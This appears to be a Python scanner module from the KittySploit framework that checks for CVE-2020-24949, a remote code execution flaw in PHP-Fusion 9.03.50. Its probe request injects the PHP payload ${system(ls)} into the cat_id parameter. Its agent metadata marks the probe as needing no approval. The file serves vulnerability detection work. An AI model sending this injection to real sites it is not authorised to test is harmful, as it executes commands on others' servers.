#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHP-Fusion 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP-Fusion 9.03.50 - Remote Code Execution Detection',
        'description': 'PHP-Fusion 9.03.50 downloads/downloads.php allows an authenticated user (not admin) to send a crafted request to the server and perform remote command execution.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'rce', 'php', 'packetstorm', 'phpfusion', 'php-fusion', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/162852/phpfusion90350-exec.txt',
            'https://github.com/php-fusion/PHP-Fusion/issues/2312',
            'http://packetstormsecurity.com/files/162852/PHPFusion-9.03.50-Remote-Code-Execution.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24949',
            'https://github.com/404notf0und/CVE-Flow',
        ],
        'cve': 'CVE-2020-24949',
    }

    def run(self):
        r = self.http_request(method="GET", path='/infusions/downloads/downloads.php?cat_id=${system(ls)}', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('infusion_db.php',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="PHP-Fusion 9.03.50 - Remote Code Execution detected",
                path='/infusions/downloads/downloads.php?cat_id=${system(ls)}',
            )
            return True
        return False

